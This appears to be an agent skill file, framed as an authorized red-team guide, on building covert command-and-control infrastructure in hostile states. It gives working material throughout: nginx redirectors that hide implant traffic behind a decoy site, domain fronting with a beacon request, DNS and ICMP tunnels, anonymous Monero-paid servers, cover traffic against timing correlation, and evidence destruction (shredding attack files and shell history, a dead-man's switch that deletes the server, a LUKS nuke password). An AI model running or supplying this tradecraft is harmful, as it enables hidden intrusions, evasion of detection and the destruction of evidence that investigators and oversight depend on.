---
name: redteam-infrastructure-opsec
description: Use when conducting authorized red team operations in hostile-state environments — covers C2 infrastructure with redirectors, domain fronting, covert channels as fallback comms, duress/burn procedures for active sessions, and cover traffic against traffic-analysis adversaries.
---

# Red Team Infrastructure OPSEC — Hostile State

## Overview

Covers the gaps between basic pentest untraceability and full red team infrastructure:
- C2 traffic that survives deep packet inspection
- Fallback comms when Tor/VPN are blocked
- What to do if detained with live infrastructure
- Cover traffic to defeat timing correlation

---

## C2 Infrastructure — Redirectors

Never expose your real C2 server to the target. All traffic must hit a disposable redirector first.

```
Target (implant) → Redirector VPS → C2 Server (protected)
                        ↑
              Burns on detection.
              C2 survives. Rebuild redirector.
```

### Redirector Setup (nginx)
```nginx
# /etc/nginx/sites-available/redirector.conf
# Legitimate-looking site on port 443 with valid cert (Let's Encrypt)
# Only forwards traffic matching your implant's URI pattern

server {
    listen 443 ssl;
    server_name legitimate-looking-domain.com;
    ssl_certificate /etc/letsencrypt/live/.../fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/.../privkey.pem;

    # Forward only traffic matching implant path
    location /assets/bootstrap.min.css {
        proxy_pass https://<real-c2-ip>/assets/bootstrap.min.css;
        proxy_set_header Host $host;
        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
    }

    # Everything else: serve real static site (plausible deniability)
    location / {
        root /var/www/html;
        try_files $uri $uri/ =404;
    }
}
```

### Redirector Rules
- One redirector per operation — burn and replace on detection
- Redirector knows nothing — it's just a proxy
- C2 server: never directly reachable, no open ports except from redirector IP
- Different hosting provider, different country than C2

---

## Domain Fronting / CDN Fronting

Make C2 traffic look like requests to major CDN (Cloudflare, AWS CloudFront, Azure CDN). Works even in highly censored environments because blocking CDN = blocking half the internet.

### How It Works
```
Implant connects to: cloudfront.net (or legit CDN domain)
SNI/TLS shows:        legit-site.cloudfront.net
Host header says:     your-c2.cloudfront.net (different subdomain)
CDN routes to:        your actual C2 backend
```
DPI sees CloudFront TLS. Can't inspect Host header (encrypted). Traffic reaches your C2.

### Cloudfront Setup
```bash
# 1. Register domain and add to Cloudfront as custom origin
# 2. Point origin to your C2 server
# 3. In implant: connect to <anything>.cloudfront.net
#    Set Host header to: <your-subdomain>.cloudfront.net
# Traffic is indistinguishable from normal CDN usage

# Test:
curl -H "Host: your-c2-subdomain.cloudfront.net" \
     https://d1234567.cloudfront.net/beacon
```

### Note
Cloudfront and Azure have partially restricted this. Alternatives:
- **Fastly**: still works with custom origins
- **Azure CDN**: classic tier still allows fronting
- Self-hosted CDN-like infrastructure with nginx

---

## Covert Channels — Fallback if Tor/VPN Blocked

### DNS over HTTPS (DoH) Tunnel — iodine
```bash
# If all TCP is blocked but DNS resolves (common in restricted networks):
# Server side (VPS):
iodined -f -c -P <password> 10.0.0.1 tunnel.yourdomain.com

# Client side (your machine):
iodine -f -P <password> ns.yourdomain.com
# Creates tun0 interface, tunnel all traffic via DNS queries

# Route traffic through tunnel:
ssh -D 1080 user@10.0.0.1   # SOCKS proxy over DNS tunnel
```

### ICMP Tunnel — ptunnel-ng
```bash
# If only ICMP (ping) works through firewall:
# Server:
ptunnel-ng -x <password>

# Client:
ptunnel-ng -p <server-ip> -lp 8000 -da <destination-ip> -dp 22 -x <password>
ssh -p 8000 user@127.0.0.1  # SSH over ICMP
```

### HTTPS over port 443 via CDN
```bash
# If only 443 passes through firewall — wrap everything in HTTPS:
# stunnel client config:
[ssh-over-https]
client = yes
accept  = 127.0.0.1:2222
connect = your-redirector.com:443

# Then:
ssh -p 2222 user@127.0.0.1
```

### Fallback Priority
```
1. Standard Tor + VPN (preferred)
2. obfs4/meek Tor bridges (if Tor blocked)
3. DoH tunnel via iodine (if TCP blocked, DNS works)
4. ICMP tunnel via ptunnel (if only ping works)
5. SMS-based OTP channel (last resort, high exposure)
```

---

## Duress / Burn Procedures

**Scenario:** Detained, live C2 session active, device about to be seized.

### Panic Wipe — Hardware Level
```bash
# Android (GrapheneOS):
# Settings → Security → Duress password
# Enter duress password → wipes device immediately, shows "wrong password"

# Laptop (Tails): pull USB = session gone, RAM cleared in ~30s on modern hardware

# Laptop (Qubes/LUKS): 
# Emergency: hold power button 5s = hard shutdown
# Data protected by LUKS — attacker needs passphrase
# For extra paranoia: LUKS nuke password (separate passphrase that wipes key slot)
```

### LUKS Nuke Setup (pre-mission)
```bash
# Install cryptsetup-nuke:
apt install cryptsetup-nuke

# Add nuke password (entering this destroys the LUKS header = unrecoverable wipe):
sudo dpkg-reconfigure cryptsetup-nuke
# Add a second passphrase — this one nukes everything

# Test: booting and entering nuke password wipes the encryption key
# Normal passphrase: decrypts normally
# Nuke passphrase: destroys key, data is gone
```

### Remote Infrastructure Burn
```bash
# Pre-configure on VPS — dead man's switch:
# Simple version: cron job that destroys VPS if check-in file not updated

# On VPS, /opt/deadman.sh:
#!/bin/bash
CHECKIN_FILE="/tmp/.alive"
MAX_AGE=7200  # 2 hours without check-in = burn

if [ $(( $(date +%s) - $(stat -c %Y $CHECKIN_FILE) )) -gt $MAX_AGE ]; then
    # Wipe sensitive data
    shred -u /opt/c2/* /tmp/attack* ~/.bash_history
    # Or destroy the whole VPS via provider API:
    curl -X DELETE -H "Authorization: Bearer $VPS_API_KEY" \
         https://api.provider.com/v2/droplets/$DROPLET_ID
fi

# Your machine: touch /tmp/.alive every 30min via cron over SSH
# If you're detained and can't check in → VPS self-destructs in 2h
```

### Check-in Protocol with Trusted Contact
```
- Check in every N hours via Signal
- Agreed code phrase: "All good" = fine
- Silence for >4h = they escalate
- Distress phrase: "Everything is fine" (exact phrase = something is wrong)
- They contact Access Now Helpline + CPJ Emergency Response
```

---

## Cover Traffic — Anti Traffic-Analysis

State adversary can correlate: "traffic burst from your IP → Tor → NGO IP" even without decrypting.

### Continuous Baseline Traffic
```bash
# On your machine: constant low-rate noise to Tor (masks when real activity happens)
while true; do
    curl -s --socks5 127.0.0.1:9050 https://check.torproject.org > /dev/null
    sleep $(( RANDOM % 60 + 30 ))  # 30-90s random interval
done

# On VPS: similar noise to unrelated destinations
```

### Traffic Shaping
```bash
# Normalize packet sizes (advanced — requires tc on Linux):
tc qdisc add dev eth0 root handle 1: tbf rate 1mbit burst 32kbit latency 400ms
# Constant bandwidth regardless of actual usage — harder to correlate
```

### Operational Timing Rules
- Never start/stop VPN exactly when pentest starts/stops — add 30+ min buffer before and after
- Don't pentest exclusively during your timezone's working hours
- Vary session lengths — not always 2h, not always starting on the hour

---

## Infrastructure Lifecycle

```
BEFORE OPERATION
[ ] Redirector VPS provisioned (Monero, Tor registration)
[ ] C2 server provisioned (different provider, different country)
[ ] Domain registered (privacy-protected, different registrar than personal)
[ ] Let's Encrypt cert on redirector
[ ] Dead man's switch configured and tested
[ ] LUKS nuke password set on laptop
[ ] GrapheneOS duress password set on phone
[ ] Fallback covert channel tested (iodine or ptunnel)

DURING OPERATION
[ ] Check-in with trusted contact every 4h
[ ] Update dead man's switch keepalive
[ ] Never access C2 server directly — redirector only
[ ] Cover traffic running on separate terminal

AFTER OPERATION (BURN EVERYTHING)
[ ] Destroy redirector VPS (no snapshot)
[ ] Destroy C2 server VPS
[ ] Wipe pentest-vm snapshot
[ ] Revoke any certs or API keys used
[ ] Document scope/findings in encrypted archive → exfil → local copy wiped
```

---

## Common Mistakes

| Mistake | Consequence | Fix |
|---------|-------------|-----|
| C2 server directly exposed | One detection = operation burned + server identified | Always use redirector |
| No redirector rotation plan | Burned redirector = no fallback | Pre-provision spare redirector |
| No dead man's switch | Detained = infrastructure stays live, evidence accumulates | Set up before entering country |
| Cover traffic from same source as C2 | Timing correlation still possible | Cover traffic via separate Tor circuit |
| Domain fronting without testing in-country DNS | CDN domain may be blocked locally | Test with local SIM before depending on it |
| Panic wipe not tested | Under stress, wrong procedure | Test wipe on non-production device before mission |
